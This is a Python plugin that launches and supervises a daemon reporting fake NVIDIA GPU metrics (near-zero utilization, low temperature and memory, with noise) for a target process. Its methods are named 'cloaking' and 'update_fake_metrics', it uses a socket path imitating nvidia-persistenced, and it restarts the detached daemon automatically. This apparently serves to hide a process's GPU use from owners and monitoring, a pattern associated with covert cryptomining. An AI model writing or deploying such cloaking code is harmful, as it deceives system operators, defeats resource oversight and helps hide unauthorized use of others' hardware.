# -*- coding: utf-8 -*-
"""NVML Proxy Plugin - Wrapper cho nvml_proxy_daemon.py

Plugin wrapper để quản lý nvml_proxy_daemon.py như một GPU plugin
trong hệ thống, cung cấp lifecycle management và integration.
"""

import os
import subprocess
import threading
import time
import logging
from pathlib import Path
from typing import Dict, Any, List, Optional

from ...core.interfaces import IGPUPlugin, IGPUCloakService
from .nvml_proxy_interface import INVMLProxyPlugin

# Import NVML Proxy logger
try:
    from ....scripts.module_loggers import get_proxy_daemon_logger
    logger = get_proxy_daemon_logger()
except ImportError:
    # Fallback nếu không có logger
    logger = logging.getLogger(__name__)


class NVMLProxyPlugin(IGPUPlugin, IGPUCloakService, INVMLProxyPlugin):
    """Plugin wrapper cho NVML Proxy Daemon"""
    
    def __init__(self, target_pid: Optional[int] = None):
        self.target_pid = target_pid
        self.proxy_process = None
        self.config = self._load_default_config()
        self.enabled = False
        self.daemon_thread = None
        self.stop_event = threading.Event()
        
        logger.info(f"NVMLProxyPlugin initialized for PID: {target_pid}")
    
    def _load_default_config(self) -> Dict[str, Any]:
        """Load default configuration"""
        return {
            'fake_utilization': 0,
            'fake_temperature': 50,
            'fake_memory_used': 100,
            'add_noise': True,
            'socket_path': '/var/run/nvidia-persistenced/socket',
            'auto_start': True,
            'daemon_path': str(Path(__file__).parent / 'nvml_proxy_daemon.py')
        }
    
    @property
    def name(self) -> str:
        return "nvml_proxy"
    
    def initialize(self, config: Dict[str, Any] = None) -> bool:
        """Initialize plugin with configuration"""
        try:
            if config:
                self.config.update(config)
            
            # Validate daemon path
            daemon_path = Path(self.config['daemon_path'])
            if not daemon_path.exists():
                logger.error(f"NVML proxy daemon not found: {daemon_path}")
                return False
            
            logger.info(f"NVML Proxy Plugin initialized with config: {self.config}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to initialize NVML Proxy Plugin: {e}")
            return False
    
    def start(self) -> bool:
        """Start plugin and proxy daemon"""
        try:
            if self.config.get('auto_start', True):
                return self.start_proxy_daemon()
            return True
        except Exception as e:
            logger.error(f"Failed to start NVML Proxy Plugin: {e}")
            return False
    
    def start_proxy_daemon(self) -> bool:
        """Start proxy daemon as subprocess"""
        try:
            daemon_path = Path(self.config['daemon_path'])
            
            # Set environment variables for daemon
            env = os.environ.copy()
            env.update({
                'NVML_FAKE_UTIL': str(self.config['fake_utilization']),
                'NVML_FAKE_TEMP': str(self.config['fake_temperature']),
                'NVML_FAKE_MEM_MB': str(self.config['fake_memory_used']),
                'NVML_ADD_NOISE': '1' if self.config['add_noise'] else '0'
            })
            
            logger.info("Starting NVML proxy daemon...")
            
            # Start daemon process
            self.proxy_process = subprocess.Popen(
                ['python3', str(daemon_path)],
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                start_new_session=True
            )
            
            # Check if process started successfully
            time.sleep(1)
            if self.proxy_process.poll() is None:
                self.enabled = True
                logger.info(f"✅ NVML Proxy daemon started with PID: {self.proxy_process.pid}")
                
                # Start monitoring thread
                self.daemon_thread = threading.Thread(
                    target=self._monitor_daemon,
                    daemon=True
                )
                self.daemon_thread.start()
                
                return True
            else:
                # Check stderr for error
                _, stderr = self.proxy_process.communicate()
                logger.error(f"❌ NVML Proxy daemon failed to start: {stderr.decode()}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Exception starting proxy daemon: {e}")
            return False
    
    def _monitor_daemon(self):
        """Monitor daemon process and restart if needed"""
        while not self.stop_event.is_set():
            if self.proxy_process and self.proxy_process.poll() is not None:
                logger.warning("NVML proxy daemon died, attempting to restart...")
                if self.config.get('auto_start', True):
                    self.start_proxy_daemon()
            
            # Check every 5 seconds
            self.stop_event.wait(5)
    
    def stop(self) -> bool:
        """Stop plugin and proxy daemon"""
        return self.stop_proxy_daemon()
    
    def stop_proxy_daemon(self) -> bool:
        """Stop proxy daemon process"""
        try:
            # Signal monitoring thread to stop
            self.stop_event.set()
            
            if self.proxy_process:
                logger.info("Stopping NVML proxy daemon...")
                
                # Try graceful termination first
                self.proxy_process.terminate()
                try:
                    self.proxy_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    logger.warning("Graceful termination failed, killing daemon...")
                    self.proxy_process.kill()
                
                self.enabled = False
                self.proxy_process = None
                logger.info("✅ NVML Proxy daemon stopped")
                return True
            
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to stop proxy daemon: {e}")
            return False
    
    def is_proxy_running(self) -> bool:
        """Check if proxy daemon is running"""
        if self.proxy_process:
            return self.proxy_process.poll() is None
        return False
    
    def update_proxy_config(self, config: Dict[str, Any]) -> bool:
        """Update proxy configuration"""
        try:
            self.config.update(config)
            
            # Restart proxy with new config if running
            if self.is_proxy_running():
                logger.info("Restarting proxy daemon with new configuration...")
                self.stop_proxy_daemon()
                return self.start_proxy_daemon()
            
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to update proxy config: {e}")
            return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get plugin status"""
        return {
            'name': self.name,
            'enabled': self.enabled,
            'proxy_running': self.is_proxy_running(),
            'proxy_pid': self.proxy_process.pid if self.proxy_process else None,
            'config': self.config,
            'target_pid': self.target_pid
        }
    
    def enable_cloaking(self, strategies: Optional[List[str]] = None) -> bool:
        """Enable cloaking functionality"""
        try:
            # For NVML proxy, cloaking is enabled when daemon is running
            if not self.enabled:
                return self.start()
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to enable cloaking: {e}")
            return False
    
    def disable_cloaking(self) -> bool:
        """Disable cloaking functionality"""
        try:
            # Stop proxy to disable cloaking
            return self.stop_proxy_daemon()
            
        except Exception as e:
            logger.error(f"❌ Failed to disable cloaking: {e}")
            return False
    
    def update_fake_metrics(self, metrics: Dict[str, int]) -> bool:
        """Update fake metrics configuration"""
        try:
            # Update config
            config_updates = {}
            for key, value in metrics.items():
                if key == 'utilization':
                    config_updates['fake_utilization'] = value
                elif key == 'temperature':
                    config_updates['fake_temperature'] = value
                elif key == 'memory_used':
                    config_updates['fake_memory_used'] = value
            
            if config_updates:
                return self.update_proxy_config(config_updates)
            
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to update fake metrics: {e}")
            return False
    
    def get_active_strategies(self) -> List[str]:
        """Get list of active strategies"""
        return ['nvml_proxy'] if self.enabled else []
    
    def cleanup(self):
        """Cleanup resources"""
        self.stop_proxy_daemon()
        if self.daemon_thread and self.daemon_thread.is_alive():
            self.stop_event.set()
            self.daemon_thread.join(timeout=5)